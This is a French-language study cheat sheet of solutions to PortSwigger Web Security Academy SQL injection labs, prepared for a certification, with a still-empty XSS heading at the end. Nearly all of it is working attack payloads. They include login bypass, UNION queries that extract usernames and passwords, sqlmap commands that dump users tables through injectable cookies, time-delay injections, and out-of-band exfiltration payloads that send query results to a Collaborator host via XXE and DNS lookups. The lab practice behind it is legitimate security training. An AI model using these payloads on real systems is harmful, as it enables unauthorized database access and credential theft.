# Liste des commandes SQLi, XSS, CRCF ect.... pour passer la certification


## 1/ SQL injection

- [X] SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

    `?category=Pets' OR 1=1 --`

- [X] SQL injection vulnerability allowing login bypass
    
    `csrf=ok13OxKIWATN6nuJiviRmIaPQBeSNtTB&username=administrator'--&password=test`
    

- [X] SQL injection UNION attack, determining the number of columns returned by the query

    `?category=Pets'+UNION+SELECT+NULL,NULL,NULL--`

- [X] SQL injection UNION attack, finding a column containing text

    `?category=Pets'+UNION+SELECT+NULL,'3QFtaD',NULL--`

- [X] SQL injection UNION attack, retrieving data from other tables

    `?category=Gifts'+UNION+SELECT+username,password+from+users--`

- [X] SQL injection UNION attack, retrieving multiple values in a single column

    `?category=Pets'+UNION+SELECT+NULL,CONCAT(username,'+',password)+FROM+users--`
   
- [X] SQL injection attack, querying the database type and version on Oracle

    `?category=Pets'+UNION+SELECT+'a',banner+FROM+v$version--`

- [X] SQL injection attack, querying the database type and version on MySQL and Microsoft

    `?category=Gifts'+UNION+SELECT+@@version,+'a'#` # pour les commentaires en MySQL

- [X] SQL injection attack, listing the database contents on non-Oracle databases

    ```sqlmap -u URL
    
    --all #Retrieve everything
    
    --dump #Dump DBMS database table entries
    
    --dbs #Names of the available databases
    
    --tables #Tables of a database ( -D <DB NAME> )
    
    --columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
    
    -D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column```
    
    
- [X] SQL injection attack, listing the database contents on Oracle

    ```
    sqlmap -u URL -D DB -T TABLE --dump
    ```

- [X] Blind SQL injection with conditional responses
    
    SQLi dans un cookie :
    
    `sqlmap -u https://0a3700fb034bd637809b997f00c0000c.web-security-academy.net --level 3 --param-filter='COOKIE' --cookie='TrackingId=Po558KqESh0tBbOQ; session=Q4g1iOWrZkGDUZefNNOOqJRqpOXqKWY8'`
    
    Le cookie est vulnérable :
    
        `sqlmap -u https://0a3700fb034bd637809b997f00c0000c.web-security-academy.net --level 3 --param-filter='COOKIE' --cookie='TrackingId=Po558KqESh0tBbOQ; session=Q4g1iOWrZkGDUZefNNOOqJRqpOXqKWY8' -D public -T users --dump`
    

- [X] Blind SQL injection with conditional errors

    `sqlmap -u https://0a1000590442bc9a801fc67600f200ab.web-security-academy.net/ --level 3 --param-filter='COOKIE' --cookie='TrackingId=hW88IAKyNKdKynag; session=CCL1SGTI9xOkwZgLmrp1s8r2CsNJ6aao' -D PETER -T USERS --dump`

- [ ] Visible error-based SQL injection

- [X] Blind SQL injection with time delays

    `sqlmap -u https://0a20005903275bbc80e42bc700710057.web-security-academy.net/ --level 3 --risk 3 --param-filter='COOKIE' --cookie='TrackingId=33iPOvvWyVfcT3Di; session=dZhzxLd1oNXuUbKrImxt3IhY4dMNTUPp' --dbms=postgresql -D public -T users --dump`
    
    Ca marche mais l'exercice veut un delay de 10sec pour une base postgresql : `TrackingId=33iPOvvWyVfcT3Di' || pg_sleep(10)--`

- [X] Blind SQL injection with time delays and information retrieval

    `sqlmap -u https://0a350086042c640081e0d44d00c70068.web-security-academy.net/ --level 3 --cookie='TrackingId=oCa0SUxSuv7kOdtU; session=DMHLaGLDeWDTGZwbjdwQ2PieyYmuEUUg' --param-filter='COOKIE' -D public -T users --dump`


- [X] Blind SQL injection with out-of-band interaction

    Il faut BurpSuite Professional
    
    On active le "Collaborator"
    
    Payload : 
    
        ```Oracle 	SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://LINK-COLLABORATOR/"> %remote;]>'),'/l') FROM dual
            Microsoft 	declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
            PostgreSQL 	create OR replace function f() returns void as $$
            declare c text;
            declare p text;
            begin
            SELECT into p (SELECT YOUR-QUERY-HERE);
            c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
            execute c;
            END;
            $$ language plpgsql security definer;
            SELECT f();
            MySQL 	The following technique works on Windows only:
            SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
        ```
        
    On colle le lien "Collaborator" :
    
    ``` '|| (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://LINK-COLLABORATOR/"> %remote;]>'),'/l') FROM dual)--```
    
    On encore URL
    
    ```
    '||+(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//LINK-COLLABORATOR/">+%25remote%3b]>'),'/l')+FROM+dual)--
    ```

- [ ] Blind SQL injection with out-of-band data exfiltration

- [ ] SQL injection with filter bypass via XML encoding






## 2/ XSS
